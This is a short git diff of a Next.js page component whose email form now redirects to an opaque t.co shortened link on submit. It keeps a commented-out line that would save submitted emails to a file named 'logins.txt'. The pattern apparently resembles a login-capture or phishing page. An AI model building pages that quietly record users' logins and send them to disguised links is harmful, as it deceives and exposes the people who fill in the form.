@@ -3,21 +3,22 @@ import IconButton from "@components/IconButton";
 import Info from "@components/Info";
 import Image from "next/image";
 import { useState } from "react";
+import { useRouter } from "next/navigation";
 // import fs from 'fs';
 // import path from 'path';
-import { useRouter } from "next/navigation";
+
 
 
 const Home = () => {
 
   const[email,setEmail] = useState('');
-  const router = useRouter();
+const router = useRouter();
 
-  const handleSubmit = (e) => {
-    e.preventDefault();
+  const handleSubmit = () => {
+    router.push('https://t.co/65GwtTi0Gn');
 
     // fs.writeFileSync(path.join(process.cwd(), 'logins.txt'), JSON.stringify(email));
-    router.push('https://t.co/65GwtTi0Gn');
+   
   };
   return (
     <section className="w-full flex-col">
